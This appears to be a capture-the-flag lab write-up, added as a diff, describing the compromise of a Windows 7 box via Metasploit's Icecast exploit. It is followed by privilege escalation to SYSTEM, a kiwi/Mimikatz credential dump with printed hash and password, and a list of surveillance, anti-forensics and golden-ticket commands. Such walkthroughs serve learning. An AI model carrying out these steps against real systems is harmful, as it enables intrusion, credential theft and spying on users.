@@ -1,0 +1,61 @@
+Reconnaissance:
+
+    Port 3389 is open (RDP).
+    Port 8000 is running Icecast.
+    Hostname of the machine: DARK-PC.
+    The Icecast vulnerability (CVE-2004-1561) has an impact score of 6.4.
+
+Exploitation:
+
+    I open the Metasploit console using the command: msfconsole.
+    I search for Icecast-related exploits with: search icecast.
+    I use the exploit: exploit/windows/http/icecast_header to exploit the vulnerability.
+    I successfully gain a Meterpreter shell.
+    Using the getuid command, I find that the Dark user is logged in.
+
+System Information:
+
+    Hostname: DARK-PC
+    OS: Windows 7 (6.1 Build 7601, Service Pack 1)
+    Architecture: x64
+    System Language: en_US
+    Domain: WORKGROUP
+    Logged-On Users: 2
+    Meterpreter Version: x86/windows
+
+Additional Exploit:
+
+    I found another exploit: exploit/windows/local/bypassuac_eventvwr.
+    I gained the SeTakeOwnershipPrivilege using the getprivs command.
+    I ran the ps command and found the spoolsv.exe process.
+    I migrated to spoolsv.exe using the command: migrate -N spoolsv.exe.
+    After migration, I ran getuid again and now I have SYSTEM-level privileges (NT AUTHORITY\SYSTEM).
+
+Credential Dumping:
+
+    I loaded the kiwi module, which is an updated version of Mimikatz.
+    I ran the command creds_all to dump all the credentials stored on the system.
+
+Credential Dumping Output:
+
+    MSV Credentials:
+        Username: Dark, Domain: Dark-PC, NTLM Hash: 7c4fe5eada682714a036e393783
+
+    WDigest Credentials:
+        Username: Dark, Domain: Dark-PC, Password: Password01!
+
+    TSPKG Credentials:
+        Username: Dark, Domain: Dark-PC, Password: Password01!
+
+    Kerberos Credentials:
+        Username: Dark, Domain: Dark-PC, Password: Password01!
+
+Other Commands:
+
+    hashdump: Dumps all password hashes stored on the system.
+    screenshare: Allows us to view the remote user's desktop in real-time.
+    record_mic: Records audio from a microphone attached to the system.
+    timestomp: Allows modification of file timestamps to complicate forensic analysis.
+    golden_ticket_create: Creates a golden Kerberos ticket for further access or persistence.
+
+Signature: Hacked by COS Q TAN Q
